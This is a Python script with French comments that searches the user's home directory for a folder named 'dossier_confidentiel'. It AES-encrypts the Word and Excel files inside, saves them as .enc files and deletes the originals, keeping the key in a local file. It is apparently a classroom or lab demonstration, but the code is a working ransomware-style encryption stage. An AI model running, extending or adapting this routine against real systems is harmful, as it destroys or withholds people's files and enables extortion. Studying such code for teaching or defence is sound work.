import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Génère une clé aléatoire et la sauvegarde dans un fichier
key_path = "key.bin"
if not os.path.exists(key_path):
    with open(key_path, "wb") as f:
        key = get_random_bytes(32) # Créer une clé de 32 octets
        f.write(key)
else:
    with open(key_path, "rb") as f:
        key = f.read()

# Chiffrement d'un fichier
def encrypt_file(file_path, output_path, key):
    with open(file_path, "rb") as f: # Ouvrir le fichier en mode binaire
        data = f.read()  
    
    cipher = AES.new(key, AES.MODE_CBC) # Créer un objet de chiffrement AES avec mode CBC
    ciphertext = cipher.encrypt(pad(data, AES.block_size)) # Chiffrer les données en ajoutant un bourrage (padding)
    # Un bourrage (padding) c'est-à-dire : Ajouter le nombre d'octets manquants pour atteindre un multiple de 16 octets
    # Pourquoi un multiple de 16 octoets ? 
    # Car AES utilise des blocs de 16 octets
    
    with open(output_path, "wb") as f:
        f.write(cipher.iv + ciphertext)  # Ajouter IV (permet de chiffrer différement même si on a voulu chiffrer la même chose) + données chiffrées

# Fonction pour trouver le dossier "dossier_confidentiel"
def find_confidential_folder(base_path, folder_name="dossier_confidentiel"):
    for root, dirs, files in os.walk(base_path): # Parcourir les sous-dossiers
        if folder_name in dirs:  # Vérifie si le dossier ciblé existe dans la liste des sous-dossiers
            return os.path.join(root, folder_name)
    return None  # Retourne None si le dossier n'est pas trouvé

# Fonction pour chiffrer tous les fichiers d'un dossier
def encrypt_all_files_in_folder(folder_path, extensions, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):  # Vérifie l'extension des fichiers
                file_path = os.path.join(root, file)
                encrypted_path = f"{file_path}.enc"  # Ajouter .enc à la fin du fichier
                print(f"Chiffrement du fichier {file_path}...")
                encrypt_file(file_path, encrypted_path, key)
                print(f"Fichier chiffré : {encrypted_path}")
                
                # Supprimer le fichier original après le chiffrement
                try:
                    os.remove(file_path)
                    print(f"Fichier original supprimé : {file_path}")
                except Exception as e:
                    print(f"Erreur lors de la suppression du fichier {file_path}: {e}")

def encrypt_main():
    # Point de départ pour la recherche (dossier utilisateur principal)
    user_home = os.path.expanduser("~")  # Répertoire principal de l'utilisateur (disque principal)

    # Rechercher le dossier "dossier_confidentiel"
    confidential_folder = find_confidential_folder(user_home)

    if confidential_folder:
        print(f"Dossier 'dossier_confidentiel' trouvé : {confidential_folder}")
        
        # Extensions des fichiers à chiffrer
        file_extensions = [".xlsx", ".docx"]  # Ajoutez ici toutes les extensions ciblées
        
        # Chiffrer tous les fichiers dans le dossier trouvé
        encrypt_all_files_in_folder(confidential_folder, file_extensions, key)
    else:
        print("Dossier 'dossier_confidentiel' introuvable.")
